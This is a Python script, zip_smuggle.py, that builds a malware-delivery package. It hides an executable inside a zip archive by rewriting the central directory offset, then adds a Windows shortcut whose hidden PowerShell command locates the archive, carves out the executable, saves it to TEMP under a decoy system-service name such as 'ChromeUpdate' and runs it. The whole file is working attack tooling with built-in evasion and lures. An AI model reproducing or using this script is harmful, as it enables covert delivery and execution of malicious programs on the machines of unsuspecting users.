#!/usr/bin/python3
import sys
import os
import struct
import shutil
from pathlib import Path
import random
import time

def locate_data_section_end(file_content_bytes):
    section_end_marker = b'\x50\x4b\x05\x06' # EOCD signature
    max_comment_length = 0xFFFF
    # Search reasonably from the end of the file
    scan_buffer = file_content_bytes[-(max_comment_length + 22):]
    relative_marker_pos = scan_buffer.rfind(section_end_marker)
    if relative_marker_pos == -1:
        raise ValueError("Data section end marker not found")
    return len(file_content_bytes) - len(scan_buffer) + relative_marker_pos

def rewrite_directory_pointer(section_end_block, new_directory_offset):
    # section_end_block structure: bytes 16-20 is the offset of the start of central directory
    return section_end_block[:16] + struct.pack('<I', new_directory_offset) + section_end_block[20:]

def embed_secondary_data(target_archive_path, data_to_embed_path):
    with open(target_archive_path, 'rb') as f:
        archive_bytes = f.read()
    with open(data_to_embed_path, 'rb') as f:
        secondary_data_bytes = f.read()

    # Add egghunter bytes to start of binary
    secondary_data_bytes = b'\x55\x55\x55\x55' + secondary_data_bytes

    section_end_offset = locate_data_section_end(archive_bytes)
    section_end_block_data = archive_bytes[section_end_offset:section_end_offset + 22] # EOCD is 22 bytes

    original_dir_offset = struct.unpack('<I', section_end_block_data[16:20])[0]
    updated_dir_offset = original_dir_offset + len(secondary_data_bytes)

    # Update EOCD
    modified_section_end_block = rewrite_directory_pointer(section_end_block_data, updated_dir_offset)

    # Rebuild archive: [original file data][secondary data][central directory][updated EOCD]
    final_archive_bytes = archive_bytes[:original_dir_offset] + secondary_data_bytes + archive_bytes[original_dir_offset:section_end_offset] + modified_section_end_block

    with open(target_archive_path, 'wb') as f:
        f.write(final_archive_bytes)

    print(f"Created {target_archive_path}")
    print(f"Old Central Directory offset: {original_dir_offset}")
    print(f"New Central Directory offset: {updated_dir_offset}")
    print(f"EOCD offset: {section_end_offset + len(secondary_data_bytes)}")

if __name__ == "__main__":

    if len(sys.argv) != 3:
        print("Usage:   python3 zip_smuggle.py <payload name> </file/to/embed>")
        print("Example: python3 zip_smuggle.py important_docs /home/ubuntu/zip_smuggling/testdata.txt")

    payloadname = sys.argv[1]
    filetosmuggle = sys.argv[2]
    outfile = payloadname + ".zip"
    szPayload = str(os.path.getsize(filetosmuggle))

    timestamp = time.strftime("%Y%m%d%H%M%S")
    possible_names = [
        "WinDriverSync",
        "DFSShareSync",
        "ChromeUpdate",
        "AdobeFlashHelper",
        "OfficeLicenseCheck",
        "NetworkConfigSvc",
        "SysHealthMonitor",
        "PrinterSpoolerFix",
        "WindowsBackupUtil",
        "JavaRuntimeSync",
        "AudioDriverSvc",
        "DiskOptimizerSvc",
    ]
    random_base_name = random.choice(possible_names)
    output_exe_filename = f"{random_base_name}{timestamp}.exe"

    print("payloadname: " + payloadname)
    print("file to smuggle: " + filetosmuggle)
    print(f"Generated output exe name: {output_exe_filename}")

    #Command to be stored in .lnk. Make sure you use escape characters as necessary for Python!
    command = ('"$name = \\"' + payloadname + '\\";'
               '$file = (get-childitem -Pa $Env:USERPROFILE -Re -Inc *$name.zip).fullname;'
               '$bytes=[System.IO.File]::ReadAllBytes($file);'
               '$size = (0..($bytes.Length - 4) | Where-Object {$bytes[$_] -eq 0x55 -and $bytes[$_+1] -eq 0x55 -and $bytes[$_+2] -eq 0x55 -and $bytes[$_+3] -eq 0x55 })[0] + 4;'
               '$length=' + szPayload + ';'
               '$chunk=$bytes[$size..($size+$length-1)];'
               '$out = \\"$Env:TEMP\\\\' + output_exe_filename + '\\";'
               '[System.IO.File]::WriteAllBytes($out,$chunk);'
               'Invoke-Item $out"')
    print("Powershell command: powershell.exe -w 1 -c " + command)

    lengthCommand = len(command) + 8

    #Read in .lnk template.  Template file contains powershell as target and is pre-seeded with '-w 1 -c ""'.  Above command will replace the "".
    with open(os.path.join(os.path.dirname(os.path.realpath(__file__)), "template", "template.lnk"), 'rb') as f:
        s = f.read()

    # '\x22\x00\x22\x00' represents the "" pre-seed we are going to search for and replace. Because it's UTF-16 there are null bytes inbetween the characters.
    # subtract 18 from location of byte pattern to locate bytes that represents length of args
    locLenByte = s.find(b'\x22\x00\x22\x00') - 18

    #Patch in correct length byte.
    s = s[:locLenByte] + lengthCommand.to_bytes(2, byteorder='little') + s[locLenByte + 2:]

    #replace '".".' with command
    s = s.replace(b'\x22\x00\x22\x00', bytes(command, 'UTF-16'))

    #strip out encoding header
    s = s.replace(b'\xff\xfe', b'')

    # Make directories that we will save lnk in and zip
    os.makedirs(os.path.join(payloadname, payloadname),exist_ok=True)

    # Write file
    lnk = os.path.join(payloadname, payloadname, payloadname) + ".lnk"
    with open(lnk, 'wb') as f:
        f.write(s)
    f.close

    # Zip folder and place assembled zip payload at proper location
    shutil.make_archive(payloadname, 'zip', payloadname)

    # Delete folder now that it has been zipped
    shutil.rmtree(payloadname, ignore_errors=False)

    # Inject file into zip
    embed_secondary_data(outfile , filetosmuggle)

    print("[+] Done. File saved at " + outfile)